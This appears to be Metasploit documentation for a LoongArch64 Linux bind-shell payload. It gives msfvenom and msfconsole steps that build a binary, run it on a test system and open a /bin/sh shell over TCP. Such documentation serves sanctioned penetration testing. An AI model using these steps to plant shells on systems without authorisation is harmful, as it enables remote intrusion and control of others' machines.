## Vulnerable Application

This inline Linux LoongArch64 payload listens for an IPv4 connection, redirects
standard input, output, and error to the socket, and executes `/bin/sh`.
It supplies an argument array compatible with BusyBox shells.
No vulnerable application is required; the payload must be executed on Linux LoongArch64.

## Verification Steps

1. Prepare a Linux LoongArch64 system with `/bin/sh` and an inbound reachable port.
1. Generate an ELF: `./msfvenom -p linux/loongarch64/shell_bind_tcp LPORT=4444 VERBOSE=true -f elf -o shell.elf`
1. Start `./msfconsole` and select `use exploit/multi/handler`.
1. Set `PAYLOAD` to `linux/loongarch64/shell_bind_tcp`.
1. Set `RHOST` to the test system and `LPORT` to the value used during generation.
1. Set `VERBOSE` to `true` and run the handler.
1. Copy `shell.elf` to the test system, run `chmod +x shell.elf`, and execute it.
1. In the resulting shell, run `id` and `uname -a`.

## Options

No specific options

## Scenarios

To be completed by a human tester with console output from a LoongArch64 Linux system.
